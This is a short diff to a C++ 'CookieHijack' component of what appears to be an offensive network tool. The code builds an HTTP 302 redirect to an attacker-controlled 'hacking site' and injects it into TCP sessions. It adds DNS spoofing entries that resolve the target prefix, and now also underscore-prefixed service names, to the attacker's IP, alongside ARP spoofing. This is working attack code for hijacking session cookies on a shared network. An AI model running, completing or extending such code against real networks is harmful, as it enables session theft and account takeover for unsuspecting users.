@@ -47,9 +47,6 @@ bool CookieHijack::doOpen() {
 	tcpBlock_.writer_.intfName_ = intfName;
 	dnsBlock_.writer_.intfName_ = intfName;
 
-	bool res = GGraph::doOpen();
-	if (!res) return false;
-
 	QStringList httpResponse;
 	httpResponse += "HTTP/1.1 302 Redirect";
 	QString locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
@@ -59,8 +56,12 @@ bool CookieHijack::doOpen() {
 	httpResponse += "";
 	tcpBlock_.backwardFinMsg_ = httpResponse;
 
+	bool res = GGraph::doOpen();
+	if (!res) return false;
+
 	dnsBlock_.dnsBlockItems_.clear();
 	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(autoArpSpoof_.intf()->ip())));
+	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "_*", QString(autoArpSpoof_.intf()->ip()))); // _4433._https.wifi.naver.com
 
 	return true;
 }
